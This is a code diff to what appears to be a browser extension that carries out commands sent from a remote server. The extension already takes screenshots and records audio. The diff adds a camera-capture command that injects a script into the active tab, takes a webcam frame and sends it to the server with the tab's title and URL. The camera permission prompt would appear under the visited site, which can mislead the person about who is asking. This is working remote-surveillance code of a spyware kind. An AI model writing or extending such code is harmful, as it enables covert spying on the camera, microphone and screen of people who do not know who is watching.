@@ -228,6 +228,11 @@ async function processCommand(command) {
                 await startAutoScreenshot(command.id, command.requestedById, command.duration);
                 break;
 
+            case 'capture_camera':
+                console.log(`📷 Camera capture requested by ${command.requestedBy}`);
+                await captureCamera(command.id, command.requestedById);
+                break;
+
             default:
                 console.log(`⚠️ Unknown command type: ${command.type}`);
         }
@@ -813,6 +818,10 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         handleAudioData(message);
     } else if (message.type === 'audio-error') {
         handleAudioError(message);
+    } else if (message.type === 'camera-data') {
+        handleCameraData(message);
+    } else if (message.type === 'camera-error') {
+        handleCameraError(message);
     }
 });
 
@@ -861,6 +870,28 @@ async function handleAudioData(message) {
 
 async function handleAudioError(message) {
     console.error('🎤 Audio recording error:', message.error);
+    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+}
+
+async function handleCameraData(message) {
+    try {
+        console.log('📷 Camera photo received!');
+
+        await sendCommandResponse(message.commandId, 'camera', {
+            image: message.image,
+            tabTitle: message.tabTitle,
+            tabUrl: message.tabUrl
+        }, message.userId);
+
+        console.log('✅ Camera photo sent to server!');
+    } catch (error) {
+        console.error('Error sending camera photo:', error);
+        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
+    }
+}
+
+async function handleCameraError(message) {
+    console.error('📷 Camera capture error:', message.error);
     await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
 }
 
@@ -955,6 +986,95 @@ async function captureAudio(commandId, userId, duration) {
 
     } catch (error) {
         console.error('Error starting audio recording:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    }
+}
+
+// ============ Camera Capture ============
+async function captureCamera(commandId, userId) {
+    try {
+        // Get active tab
+        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
+        
+        if (!tab) {
+            throw new Error('No active tab found');
+        }
+
+        console.log('📷 Starting camera capture...');
+
+        // Inject content script to handle camera capture
+        await chrome.scripting.executeScript({
+            target: { tabId: tab.id },
+            func: async (cmdId, tabInfo, usrId) => {
+                try {
+                    console.log('📷 [Content] Requesting camera access...');
+                    
+                    // Request camera access
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+
+                    // Create video element to capture frame
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    
+                    // Wait for video to be ready
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+
+                    // Wait a bit for camera to adjust (exposure, focus, etc.)
+                    await new Promise(resolve => setTimeout(resolve, 500));
+
+                    // Create canvas and capture frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    // Convert to base64
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Send to background script
+                    chrome.runtime.sendMessage({
+                        type: 'camera-data',
+                        commandId: cmdId,
+                        image: imageData,
+                        tabTitle: tabInfo.title,
+                        tabUrl: tabInfo.url,
+                        userId: usrId
+                    });
+
+                    console.log('📷 [Content] Camera photo captured!');
+
+                } catch (err) {
+                    chrome.runtime.sendMessage({
+                        type: 'camera-error',
+                        commandId: cmdId,
+                        error: err.message,
+                        userId: usrId
+                    });
+                }
+            },
+            args: [commandId, { title: tab.title, url: tab.url }, userId]
+        });
+
+        console.log('📷 Camera capture script injected, requesting user permission...');
+
+    } catch (error) {
+        console.error('Error starting camera capture:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
 }
